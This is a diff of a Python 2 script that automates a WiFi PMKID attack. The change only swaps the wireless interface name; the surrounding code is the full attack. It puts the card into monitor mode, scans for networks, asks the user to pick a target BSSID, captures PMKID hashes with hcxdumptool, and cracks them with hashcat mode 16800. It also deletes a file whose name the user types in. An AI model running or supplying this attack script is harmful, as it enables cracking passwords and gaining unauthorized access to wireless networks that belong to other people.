@@ -1,7 +1,7 @@
 import os
 import subprocess
 
-interface = "wlan0mon"
+interface = "wlp2s0mon"
 path = "/Pentesting/Wifi_tools/PMKID/bssid/bssid.txt"
 
 os.chdir('/Pentesting/Wifi_tools/PMKID/bssid')
@@ -10,8 +10,8 @@ os.system('touch bssid.txt')
 print('Switching to monitoring mode')
 os.system('sleep 4')
 os.system('clear')
-subprocess.call(["airmon-ng", "stop", "wlan0"])
-subprocess.call(["airmon-ng", "start", "wlan0"])
+subprocess.call(["airmon-ng", "stop", "wlp2s0"])
+subprocess.call(["airmon-ng", "start", "wlp2s0"])
 os.system('clear')
 os.system('ifconfig')
 os.system('sleep 4')
@@ -21,7 +21,7 @@ os.system('clear')
 print('Monitoring starting, Please select WIFI to decrypted (BSSISD only)')
 os.system('sleep 2')
 os.system('clear')
-os.system("xterm -e 'airodump-ng -w /tmp/scan --output-format csv wlan0mon; read'")
+os.system("xterm -e 'airodump-ng -w /tmp/scan --output-format csv wlp2s0mon; read'")
 
 bssid = raw_input(
     'Please enter bssid for wifi device you want to decrypted: \n')
@@ -38,7 +38,7 @@ deleted = raw_input(
 subprocess.call(["rm", deleted])
 os.chdir('/Pentesting/Wifi_tools/PMKID/hcxdumptool')
 os.system('rm hash')
-os.system("xterm -e 'hcxdumptool -o hash -i wlan0mon --filterlist=/Pentesting/Wifi_tools/PMKID/bssid/update_bssid.txt --filtermode=2 --enable_status=3; read'")
+os.system("xterm -e 'hcxdumptool -o hash -i wlp2s0mon --filterlist=/Pentesting/Wifi_tools/PMKID/bssid/update_bssid.txt --filtermode=2 --enable_status=3; read'")
 subprocess.call(["hcxpcaptool", "-z", deleted, "hash"])
 subprocess.call(["mv",deleted, "/Pentesting/Wifi_tools/PMKID/hashcat"])
 os.chdir('/Pentesting/Wifi_tools/PMKID/hashcat')
@@ -51,5 +51,5 @@ wait = raw_input(
     'Please wait for decrypting to finish, Then hit enter key: \n')
 subprocess.call(["./hashcat", "-m", "16800", deleted, "--force", "--show"])
 os.system('sleep 4')
-subprocess.call(["airmon-ng", "stop", "wlan0mon"])
+subprocess.call(["airmon-ng", "stop", "wlp2s0mon"])
 exit(0)
